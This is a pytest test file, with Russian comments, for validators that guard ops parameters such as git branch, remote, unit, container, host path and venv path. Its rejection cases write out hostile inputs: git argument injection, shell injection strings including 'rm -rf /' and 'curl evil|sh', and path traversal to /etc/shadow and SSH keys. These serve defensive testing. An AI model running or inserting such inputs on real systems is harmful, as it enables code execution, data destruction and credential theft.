import pytest

from hermes_cli.ops_params import (
    OpsParamError,
    validate_branch,
    validate_container,
    validate_host_path,
    validate_remote,
    validate_unit,
    validate_venv_path,
)


def test_validate_branch_accepts_an_ordinary_branch_name():
    assert validate_branch("local/customizations") == "local/customizations"


@pytest.mark.parametrize(
    "value",
    [
        "--upload-pack=/bin/sh",   # argv-инъекция: git выполнит произвольную программу
        "-o",                       # любой аргумент, начинающийся с дефиса
        "main; rm -rf /",          # метасимволы shell
        "main && curl evil|sh",
        "../../etc/passwd",        # обход пути
        "feature/..hidden",        # ".." запрещён и правилами refname
        "/leading-slash",
        "trailing-slash/",
        "",
        "   ",
        "a" * 201,                 # длина
        "ветка",                   # не-ASCII
    ],
)
def test_validate_branch_rejects_hostile_values(value):
    with pytest.raises(OpsParamError):
        validate_branch(value)


def test_validate_remote_accepts_only_origin():
    assert validate_remote("origin") == "origin"
    with pytest.raises(OpsParamError):
        validate_remote("https://example.com/evil.git")


def test_validate_unit_accepts_only_allowlisted_units():
    assert validate_unit("job-intel-daily.service") == "job-intel-daily.service"
    with pytest.raises(OpsParamError):
        validate_unit("ssh.service")


def test_validate_container_rejects_ephemeral_sandbox_containers():
    assert validate_container("monitoring-grafana") == "monitoring-grafana"
    # hermes-<hex> контейнеры эфемерны: перезапуск бессмыслен и опасен
    with pytest.raises(OpsParamError):
        validate_container("hermes-15977a64")


def test_validate_host_path_accepts_an_allowlisted_root():
    assert validate_host_path("/var/lib/browser-desktop/playwright-venv") == (
        "/var/lib/browser-desktop/playwright-venv"
    )


def test_validate_host_path_accepts_the_root_itself():
    assert validate_host_path("/etc/job-intel") == "/etc/job-intel"


@pytest.mark.parametrize(
    "value",
    [
        "/etc/shadow",                     # вне allowlist
        "/var/lib/../../etc/shadow",       # обход через .. с разрешённым префиксом
        "/var/lib/browser-desktop/../../root/.ssh/id_rsa",
        "/etc/job-intelligence",           # префикс совпадает, каталог другой
        "var/lib/job-intel",               # не абсолютный
        "",
        "   ",
        None,
    ],
)
def test_validate_host_path_rejects(value):
    with pytest.raises(OpsParamError, match="invalid_host_path"):
        validate_host_path(value)


def test_validate_venv_path_accepts_an_allowlisted_venv():
    assert validate_venv_path("/var/lib/browser-desktop/playwright-venv") == (
        "/var/lib/browser-desktop/playwright-venv"
    )


@pytest.mark.parametrize(
    "value",
    [
        "/tmp/attacker-venv",                                  # произвольный каталог
        "/var/lib/browser-desktop/playwright-venv/bin",        # вложенное, не сам venv
        "/home/hermes/.hermes/hermes-agent/.venv",             # соседний venv без pytest
        "",
        None,
    ],
)
def test_validate_venv_path_rejects(value):
    with pytest.raises(OpsParamError, match="invalid_venv_path"):
        validate_venv_path(value)
